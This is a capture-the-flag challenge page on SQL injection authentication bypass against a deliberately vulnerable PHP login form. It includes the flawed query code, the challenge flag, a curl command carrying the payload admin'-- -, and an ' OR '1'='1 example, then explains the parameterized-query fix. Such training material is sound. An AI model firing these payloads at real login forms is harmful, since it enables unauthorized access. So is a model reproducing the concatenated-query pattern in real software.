# 🚪 Challenge 0 — Knock Twice, Walk Right In

> **Vector:** SQL Injection (Authentication Bypass) · **Endpoint:** `POST /` (fields `username`, `password`)

*(alt titles: "The Bouncer Can't Read" · "Comment Out the Bouncer" · "No Password? No Problem")*

---

## 📝 Description
The NIGHTFALL admin portal swears it's locked down — username, password, the works. But the bouncer at this door doesn't actually *check* your ID, he just repeats whatever you tell him straight to the database. Whisper the right words and the lock forgets it was ever there.

Your mission: log in as **admin** without knowing the password. The door is at `POST /`. Slip past the guard and grab what's inside.

## 🧩 Vulnerable Code
**`login-app/index.php`**
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // !!! VULNERABLE: user input concatenated straight into the SQL string.
    // !!! No parameterization, no escaping.
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

    $result = $db->query($query);
    $user = $result ? $result->fetch(PDO::FETCH_ASSOC) : false;
    if ($user) {
        // ✅ authenticated — session established, redirect to dashboard
        $_SESSION['authed'] = true;
        $_SESSION['user']   = $user['username'];
        header('Location: /');
        exit;
    } else {
        $error = 'Invalid username or password.';
    }
}
```

## 🚩 Flag
```
CTF{8ee4d84cbeef15123c24791da26006d9}
```
*(from `flags/flag_login.txt`)*

## 💡 Hints
- **Nudge:** The login form talks to the database using *exactly* what you type — nothing gets cleaned up first. What happens if your "username" contains a quote `'`?
- **Warmer:** In SQL, `--` starts a comment. Everything after it on the line is ignored... including that pesky password check. 🤔
- **The key:** Try username `admin'-- ` (trailing space) and any password.
  ```bash
  curl -s -X POST "http://<host>/" \
    --data-urlencode "username=admin'-- -" \
    --data-urlencode "password=whatever"
  ```

## 🔍 Vulnerable Line Explanation
**`login-app/index.php:46`**
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```
Your raw input is dropped **directly into the SQL string** — no parameterization, no escaping. You're not *answering* the query, you get to *rewrite* it.

| You send | Query becomes | Result |
|---|---|---|
| `admin'-- ` | `... WHERE username = 'admin'-- ' AND password = '...'` | `'` closes the string early, `-- ` comments out the whole password check → you're in as admin. |
| `' OR '1'='1` | `... WHERE username = '' OR '1'='1' AND password = '...'` | `'1'='1'` is always true → returns the first user. |

**Fix:** parameterized query — `WHERE username = ? AND password = ?` — and store salted password hashes.
